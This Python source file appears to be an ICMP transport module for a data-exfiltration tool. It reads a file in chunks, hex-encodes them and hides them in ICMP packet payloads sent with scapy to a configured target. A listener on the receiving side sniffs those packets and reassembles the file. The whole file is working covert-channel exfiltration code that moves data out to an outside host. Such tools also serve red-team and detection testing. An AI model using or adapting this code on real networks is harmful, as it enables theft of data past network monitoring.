import logging
import os

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Ether, sendp, Raw, sniff
from scapy.layers.inet import ICMP, IP

config = None
app_exfiltrate = None


def send(exfiltrate_file, file):
    target = config['target']
    num_bytes = config['num_bytes']

    app_exfiltrate.log_message('warning', "[!] Registering packet for the file")
    data = "%s" % os.path.basename(exfiltrate_file.file_to_send)

    packet_index = 0
    ether = Ether()
    ip = IP(dst=target)
    icmp = ICMP(unused=exfiltrate_file.jobid, seq=packet_index)
    pkt = ether / ip / icmp / Raw(load=data)
    sendp(pkt)

    while True:
        packet_index += 1
        data_file = file.read(num_bytes).encode('hex')
        if not data_file:
            break
        # ok("Using {0} as transport method".format(protocol_name))

        app_exfiltrate.log_message('info', "[icmp] Sending {} bytes with ICMP packet".format(len(data)))
        icmp = ICMP(unused=exfiltrate_file.jobid, seq=packet_index)
        pkt = ether / ip / icmp / Raw(load=data_file)
        sendp(pkt)

    data = "DONE:%s" % exfiltrate_file.checksum
    icmp = ICMP(unused=exfiltrate_file.jobid, seq=packet_index)
    pkt = Ether() / ip / icmp / Raw(load=data)
    sendp(pkt)


def listen():
    app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
    sniff(filter="icmp and icmp[0]=8", prn=analyze)


def analyze(packet):
    icmp = packet.getlayer(2)
    jobid = icmp.fields['unused']
    packet_index = icmp.fields['seq']
    raw = packet.lastlayer()
    data = raw.fields['load']

    if packet_index == 0:
        app_exfiltrate.register_file(jobid, data)
    elif data[0:5] == 'DONE:':
        app_exfiltrate.retrieve_file(jobid, data[5:])
    else:
        app_exfiltrate.retrieve_data(jobid, packet_index, data)


class Protocol:
    def __init__(self, app, conf):
        global config
        global app_exfiltrate
        config = conf
        app_exfiltrate = app
        app.register_protocol('icmp', {'send': send, 'listen': listen})